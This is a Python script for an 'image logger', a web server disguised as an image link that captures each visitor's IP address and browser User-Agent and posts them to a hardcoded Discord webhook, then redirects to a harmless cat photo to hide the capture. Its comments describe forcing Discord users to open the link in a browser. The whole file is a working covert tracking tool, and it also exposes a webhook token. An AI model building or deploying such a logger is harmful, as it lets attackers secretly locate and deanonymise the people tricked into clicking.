# main.py
from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests
import base64

# --- CONFIGURATION ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1553387456055746630/poeAGPGuJhnYqtBP3rFPxP1ns-_7w8237GamBKrqEkLDrNvtbApHV1w7fg_dyjZMA8oB"
DEFAULT_IMAGE = "https://cdn.pixabay.com/photo/2023/07/04/08/31/cats-8105667_1280.jpg" # z.B. https://i.imgur.com/example.png
# ---------------------

class ImageLoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = parse.urlparse(self.path)
        query_params = parse.parse_qs(parsed_path.query)
        
        # Get IP and User Agent
        client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        # Get Image URL from query param or use default
        img_url = query_params.get('img', [DEFAULT_IMAGE])[0]
        
        # Log to Discord Webhook
        try:
            embed = {
                "title": "📸 Image Logger Triggered",
                "color": 15158332,
                "fields": [
                    {"name": "IP Address", "value": f"`{client_ip}`", "inline": True},
                    {"name": "User Agent", "value": f"```{user_agent[:100]}```", "inline": False},
                    {"name": "Target Image", "value": f"[Link]({img_url})", "inline": False}
                ],
                "footer": {"text": "Astro Security Suite"}
            }
            payload = {"embeds": [embed]}
            requests.post(WEBHOOK_URL, json=payload, timeout=5)
        except Exception as e:
            print(f"Webhook failed: {e}")

        # Serve a "broken" image or redirect to trigger the "Open in Browser" behavior
        # We send a 404 or a minimal response that Discord can't embed properly
        self.send_response(404)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # HTML that redirects to the actual image after logging
        html = f"""
        <html>
        <head>
            <meta http-equiv="refresh" content="0; url={img_url}" />
        </head>
        <body>
            <p>Loading image...</p>
        </body>
        </html>
        """
        self.wfile.write(html.encode())

    def log_message(self, format, *args):
        pass # Suppress console logs

if __name__ == "__main__":
    from http.server import HTTPServer
    server = HTTPServer(('0.0.0.0', 8080), ImageLoggerHandler)
    print("Astro Image Logger running on port 8080")
    server.serve_forever()
